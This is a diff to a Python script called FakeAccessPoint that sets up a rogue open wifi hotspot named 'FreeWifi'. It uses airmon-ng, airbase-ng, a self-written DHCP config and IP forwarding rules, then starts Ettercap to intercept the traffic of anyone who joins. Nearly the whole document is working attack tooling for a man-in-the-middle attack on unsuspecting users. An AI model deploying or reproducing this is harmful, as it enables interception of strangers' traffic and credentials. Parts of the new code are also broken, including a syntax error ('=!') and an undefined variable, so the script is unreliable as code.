@@ -4,22 +4,28 @@ import netifaces
 import os 
 import time 
 import os.path
+import sys
 
 # Define Attributes
 
-Version = "1.0"
+Version = "2.0"
 Creator = "Raspberry"
 Published = "https://github.com/Raspberryy/FakeAccessPoint"
 
-APName = "Free Wifi"
-APHostingInterface = "wlan0"
 InternetInterface = "wlan0"
+APHostingInterface = "wlan1"
+MonitorInterface = "wlan1mon"
+
+APName = "FreeWifi"
 Gateway = "192.168.0.1"
 Channel = "11"
+
+
 
 Path = os.path.dirname(os.path.abspath(__file__))
 OptionsArray = []
 InterfaceArray = []
+NoStart = 0
 
 # Define Colours
 
@@ -107,11 +113,15 @@ def GettingAttributes():
                 GettingAttributes()
 	
 	# Monitor Mode
-	AirmonCommand = "airmon-ng start "+APHostingInterface 
+	AirmonCommand = "airmon-ng start " + APHostingInterface 
+	os.system("airmon-ng check kill")
 	os.system(AirmonCommand)
 	
+	
+	
 	# Starting other Defs
-	SetUpDhcpServer()
+	MonitorInterface = APHostingInterface + "mon"
+	SetUpDhcpServer(MonitorInterface)
 	SetIpRules(Gateway, InternetInterface)
 	print yellow + "[*]"  + white + "Starting Ettercap"
 	StartEttercap()
@@ -137,7 +147,7 @@ def LoadTable(InterfaceArray, OptionsArray):
 
 
 
-def SetUpDhcpServer():
+def SetUpDhcpServer(MonitorInterface):
 	print yellow + "[*]"  + white + "Set up Dhcp Server"
 	if(os.path.isfile("/etc/dhcpd.conf")):
 		print red +'[-] ' + white + "Deleting old dhcpd.conf"
@@ -159,10 +169,10 @@ def SetUpDhcpServer():
 	os.system("echo 'Option domain-name-servers 192.168.1.1;' >> /etc/dhcpd.conf ")
 	os.system("echo 'Range 192.168.1.2 192.168.1.40;' >> /etc/dhcpd.conf ")
 	os.system("echo '}' >> /etc/dhcpd.conf ")	
-	StartAirbaseServer(UserAP)
+	StartAirbaseServer(UserAP, MonitorInterface)
 
 
-def StartAirbaseServer(UserAP):
+def StartAirbaseServer(UserAP, MonitorInterface):
 	print yellow + "[*]"  + white + "Starting Airbase-Server"
 	# Check for LogFile
 	LogFile = Path + "/AirBase.log"
@@ -172,7 +182,7 @@ def StartAirbaseServer(UserAP):
 	
 
 	# Set Air-Base String
-	CommandAirBase = "sudo airbase-ng -c " + Channel + " -e " + UserAP +  " mon0 > " + Path + "/AirBase.log &"
+	CommandAirBase = "sudo airbase-ng -c " + Channel + " -e " + UserAP +  " " + MonitorInterface + " > " + Path + "/AirBase.log &"
 	 
 	#Execute
 	os.system(CommandAirBase) 
@@ -197,20 +207,92 @@ def SetIpRules(Gateway, InterfaceInternet):
 	os.system("/etc/init.d/isc-dhcp-server start")
 	
 
-def HelpFunction():
+def PrintHelp():
 	print ""
+	print green + under +  "		FakeAccessPoint - BY RASPBERRYY" + white	
+	print ""
+	print "	Command List:"
+	print "	-m		Use manuel Values"
+	print "	-h --help	Prints this"	
+	
+	
+def ManuelAttack():
+
+	ManuelDHCP()	
+	
+	# Airbase Server
+	LogFile = Path + "/AirBase.log"
+	if(os.path.isfile(LogFile)):
+		print red +'[-] ' + white + "Delete AirBase.log"
+        	os.system("rm %s" %LogFile)
+	# Set Air-Base String
+	CommandAirBase = "sudo airbase-ng -c " + Channel + " -e " + APName +  " " + MonitorInterface + " > " + Path + "/AirBase.log &" 
+	#Execute
+	os.system(CommandAirBase)
+
+	SetIpRules(Gateway, InterfaceInternet)
+	StartEttercap()
 
 
-
-
+def ManuelDHCP():
+	if(os.path.isfile("/etc/dhcpd.conf")):
+		print red +'[-] ' + white + "Deleting old dhcpd.conf"
+		os.system("rm /etc/dhcpd.conf")	
+	print green + '[+] ' + white + "Creating dhcpd.conf"
+	apnamewithquo = '"' + APName + '"' 
+	os.system("echo 'Authoritative;' > /etc/dhcpd.conf ")
+	os.system("echo 'Default-lease-time 600;' >> /etc/dhcpd.conf ")
+	os.system("echo 'Max-lease-time 7200;' >> /etc/dhcpd.conf ")
+	os.system("echo 'Subnet 192.168.1.0 netmask 255.255.255.0 {' >> /etc/dhcpd.conf ")
+	os.system("echo 'Option domain-name %s ;' >> /etc/dhcpd.conf " % apnamewithquo)
+	os.system("echo 'Option routers 192.168.1.1;' >> /etc/dhcpd.conf ")
+	os.system("echo 'Option subnet-mask 255.255.255.0;' >> /etc/dhcpd.conf ")
+	os.system("echo 'Option domain-name-servers 192.168.1.1;' >> /etc/dhcpd.conf ")
+	os.system("echo 'Range 192.168.1.2 192.168.1.40;' >> /etc/dhcpd.conf ")
+	os.system("echo '}' >> /etc/dhcpd.conf ")
 
 # Main Program
 
-APHostingInterface = GettingAttributes()
-print yellow + "[*]" + white + "Stopping Ettercap"
-print yellow + "[*]" + white + "Stopping mon0"
-os.system("airmon-ng stop mon0")
-print yellow + "[*]" + white + "Stopping " +  APHostingInterface
-os.system("airmon-ng stop %s" %APHostingInterface)
-print red + "[!]" + white + "Make sure to close the Airbase Server"
+if len(sys.argv)==1:
+	sys.argv.append(" ")
+
+	
+if sys.argv[1]=="-h":
+        PrintHelp()
+	BootBol = 1
+	
+	BootBol = 1
+elif sys.argv[1]=="--help":
+        PrintHelp()
+	BootBol = 1
+
+
+elif sys.argv[1]=="-m":
+	ManuelAttack()
+	NoStart = 1
+
+
+
+# No Commands - Starting Normal FakeAccessPoint
+if NoStart=!1:
+	APHostingInterface = GettingAttributes()
+	MonitorInterface = APHostingInterface + "mon"
+	print yellow + "[*]" + white + "Stopping Ettercap"
+	print yellow + "[*]" + white + "Stopping " + MonitorInterface
+	os.system("airmon-ng stop mon0")
+	print yellow + "[*]" + white + "Stopping " +  APHostingInterface
+	os.system("airmon-ng stop %s" %APHostingInterface)
+	print red + "[!]" + white + "Make sure to close the Airbase Server"
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
 
